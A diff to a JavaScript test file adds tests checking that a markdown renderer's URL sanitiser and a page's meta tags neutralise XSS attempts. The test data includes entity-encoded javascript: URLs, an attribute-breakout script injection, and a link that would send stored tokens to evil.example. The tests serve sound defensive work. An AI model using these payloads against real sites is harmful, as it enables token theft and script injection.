@@ -5,6 +5,7 @@ import os from "node:os";
 import path from "node:path";
 import { parseFrontMatter, stringifyFrontMatter, loadTunes, loadHymns, loadAll, loadAuthors } from "../lib/content.mjs";
 import { renderMarkdown, renderInline, safeUrl } from "../lib/markdown.mjs";
+import { page } from "../lib/layout.mjs";
 import { prepareHymn } from "../lib/render-hymns.mjs";
 
 test("front matter: fields, lists, nested FAQ, and the body after it", () => {
@@ -121,6 +122,21 @@ test("markdown: raw HTML is text and only followable links keep their address (p
   assert.equal(renderInline("Mail [us](mailto:hello@notefusion.studio)."), 'Mail <a href="mailto:hello@notefusion.studio">us</a>.');
   for (const ok of ["/app", "#faq", "https://example.com/a?b=c", "http://x.y", "mailto:a@b.c", "guide.html", "?q=1"]) assert.equal(safeUrl(ok), ok);
   for (const bad of ["javascript:alert(1)", " vbscript:x", "data:text/html,x", "java\tscript:x", "file:///etc"]) assert.equal(safeUrl(bad), "#");
+  // Encoded as the browser decodes an attribute: still a script.
+  for (const bad of ["javascript&#58;alert(1)", "javascript&#x3A;alert(1)", "javascript&#58alert(1)", "javascript&colon;alert(1)",
+    "&#106;avascript:alert(1)", "java&Tab;script:alert(1)", "\u0001javascript:alert(1)"]) assert.equal(safeUrl(bad), "#", bad);
+  assert.equal(safeUrl("https://example.com/?a=1&amp;b=2"), "https://example.com/?a=1&amp;b=2");
+  const encoded = renderInline("See [the guide](javascript&#58;fetch('//evil.example/?t='+localStorage['nf.web.tokens'])) ![i](&#106;avascript:x)");
+  assert.doesNotMatch(encoded, /href="(?!#")|src="(?!#")/);
+  assert.match(encoded, /<a href="#">the guide<\/a>/);
+  assert.equal(renderInline('[a](/app "a<b")'), '<a href="/app" title="a&lt;b">a</a>');
+});
+
+test("a cover's address is escaped in the page's meta tags", () => {
+  const html = page({ path: "/blog/x/", title: "T", description: "D", body: "",
+    image: { src: 'https://x.example/a.jpg"><script>alert(1)</script><meta x="', width: 1200, height: 675, alt: "A" } });
+  assert.doesNotMatch(html, /<script>alert/);
+  assert.match(html, /<meta property="og:image" content="https:\/\/x\.example\/a\.jpg&quot;&gt;&lt;script&gt;/);
 });
 
 test("authors: an optional photo under /assets; posts: an optional dek", () => {
